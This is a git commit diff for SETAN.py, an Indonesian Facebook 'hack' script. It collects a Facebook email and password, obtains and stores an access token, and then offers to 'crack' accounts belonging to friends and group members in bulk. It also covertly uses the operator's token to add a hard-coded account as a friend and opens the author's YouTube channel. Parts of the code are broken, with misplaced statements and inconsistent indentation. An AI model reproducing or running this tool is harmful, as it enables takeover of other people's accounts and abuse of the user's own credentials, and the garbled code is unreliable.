624895edc59765e3cff95a44274e0ff32da960e1
XbalMeonk <48819531+XbalMeonk@users.noreply.github.com>
2019-08-07 01:39:35 +0700

    update SETAN.py

--- SETAN.py
+++ SETAN.py
@@ -1,7 +1,4 @@
-#coding by: Mr. Xbal Meonk
-#jangan recode cuk
-
-
+#Decompiled by MR.Xb4L_m30nk
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -69,7 +66,142 @@ dgray = "\033[1;30m"
 ir = "\033[0;101m"
 reset = "\033[0m"
 
-else:
+
+def login():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r')
+        menu()
+    except (KeyError, IOError):
+        os.system('clear')
+	print
+	print("                                     ")
+	print("                                     ")
+	print("{}   +================================+ ").format(gr)
+	print("{}   |    {}TOOL'S  H@CK  FACEBOOK {}     | ").format(gr,cy,gr)
+	print("{}   |            {}TERBARU            {} | ").format(gr,cy,gr)         
+	print("{}   |--------------------------------| ").format(gr)
+	print("{}   |    Author {} : {}Mr.XbalMeonk      | ").format(gr,re,gr)
+	print("{}   | {}   facebook{}:{} Cengir Eea        | ").format(gr,cy,re,gr)
+	print("{}   | {}   Youtube :{} Xbal Meonk        | ").format(gr,re,gr)
+	print("{}   |--------------------------------| ").format(gr)
+	print("{}   |     {}SELAMAT  MENCOBA.^_^. {}     | ").format(gr,ye,gr)
+	print("{}   +================================+ ").format(gr)
+        print 40 * '\x1b[1;97m\xe2\x95\x90'
+        print '\x1b[1;91m[\xe2\x98\x86] \x1b[1;92mLOGIN AKUN FACEBOOK AKUN FB \x1b[1;91m[\xe2\x98\x86]'
+        id = raw_input('\x1b[1;91m[+] \x1b[1;36mEmail/no.hp FB \x1b[1;91m:\x1b[1;92m ')
+        pwd = getpass.getpass('\x1b[1;91m[+] \x1b[1;36mPassword FB \x1b[1;91m:\x1b[1;92m ')
+        tik()
+        try:
+            br.open('https://m.facebook.com')
+        except mechanize.URLError:
+            print '\n\x1b[1;91m[!] Tidak ada koneksi'
+            keluar()
+
+        br._factory.is_html = True
+        br.select_form(nr=0)
+        br.form['email'] = id
+        br.form['pass'] = pwd
+        br.submit()
+        url = br.geturl()
+        if 'save-device' in url:
+            try:
+                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + id + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': id, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
+                x = hashlib.new('md5')
+                x.update(sig)
+                a = x.hexdigest()
+                data.update({'sig': a})
+                url = 'https://api.facebook.com/restserver.php'
+                r = requests.get(url, params=data)
+                z = json.loads(r.text)
+                zedd = open('login.txt', 'w')
+                zedd.write(z['access_token'])
+                zedd.close()
+                print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
+                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
+                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                time.sleep(2)
+                menu()
+            except requests.exceptions.ConnectionError:
+                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                keluar()
+
+        if 'checkpoint' in url:
+            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            keluar()
+        else:
+            print '\n\x1b[1;91m[!] Login Gagal'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
+
+
+def menu():
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        os.system('clear')
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+    else:
+        try:
+            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
+            a = json.loads(otw.text)
+            nama = a['name']
+            id = a['id']
+        except KeyError:
+            os.system('clear')
+            print '\x1b[1;91m[!] \x1b[1;93mMaaf akun kena Checkpoint'
+            os.system('rm -rf login.txt')
+            time.sleep(1)
+            login()
+        except requests.exceptions.ConnectionError:
+            print '\x1b[1;91m[!] Tidak ada koneksi'
+            keluar()
+            
+              global toket
+    os.system('clear')
+    try:
+        toket = open('login.txt', 'r').read()
+    except IOError:
+        print '\x1b[1;91m[!] Token tidak ditemukan'
+        os.system('rm -rf login.txt')
+        time.sleep(1)
+        login()
+
+    os.system('clear')
+    print logo
+    print 40 * '\x1b[1;97m\xe2\x95\x90'
+    print '\x1b[1;37;40m1. Crack dari daftar Teman'
+    print '\x1b[1;37;40m2. Crack dari anggota Grup'
+    print '\x1b[1;31;40m0. Kembali'
+    print
+    pilih_super()
+
+
+def pilih_super():
+    peak = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
+    if peak == '':
+        print '\x1b[1;91m[!] Jangan kosong'
+        pilih_super()
+    else:
+        if peak == '1':
+            os.system('clear')
+            print logo
+            print 40 * '\x1b[1;97m\xe2\x95\x90'
+            jalan('\x1b[1;91m[+] \x1b[1;92mMengambil id teman \x1b[1;97m...')
+            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+            z = json.loads(r.text)
+            for s in z['data']:
+                id.append(s['id'])
+
+        else:
             if peak == '2':
                 os.system('clear')
                 print logo
@@ -154,3 +286,4 @@ else:
     p.map(main, id)
     print '\n\x1b[1;91m[+] \x1b[1;97mSelesai Cuk...'
     raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
+    super()
